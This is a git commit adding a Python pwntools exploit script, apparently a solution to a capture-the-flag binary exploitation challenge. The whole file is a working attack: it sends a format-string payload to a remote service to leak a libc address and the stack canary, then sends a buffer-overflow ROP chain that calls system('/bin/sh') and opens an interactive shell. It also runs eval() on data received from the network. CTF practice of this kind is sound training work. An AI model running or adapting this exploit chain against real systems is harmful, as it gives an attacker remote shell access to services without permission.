91f700ce510abec693103de5849ce558b888599b
Eren Şimşek <57567358+Aporlorxl23@users.noreply.github.com>
2022-02-26 19:46:15 +0300

    Create remote.py

---
+++ Pwn/Liveoverflow/remote.py
@@ -0,0 +1,20 @@
+from pwn import *
+
+context(terminal = ["tmux","splitw","-h"], os="linux", arch ="amd64")
+proc = remote("1.1.1.1", 2323)
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+proc.recv()
+payload = b"%p "*39
+proc.sendline(payload)
+All = proc.recv()
+Leak = eval(All[30:30+14].decode())
+Canary = int(All[462:462+18].decode(), 16)
+log.info("Leak: "+ hex(Leak))
+log.info("Canary: "+ hex(Canary))
+libc.address = Leak - libc.sym['_IO_2_1_stdin_']
+log.info("Libc address: "+ hex(libc.address))
+payload =b"X"*264+p64(Canary)+p64(0) + p64(libc.address + 0x25679) + p64(libc.address + 0x26b72) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.address + 0x27529) + p64(0)+ p64(libc.sym["system"])
+#payload = b"X"*264+p64(Canary)+p64(0)+p64(libc.address + 0xe6c81)
+proc.sendline(payload)
+proc.recv()
+proc.interactive()
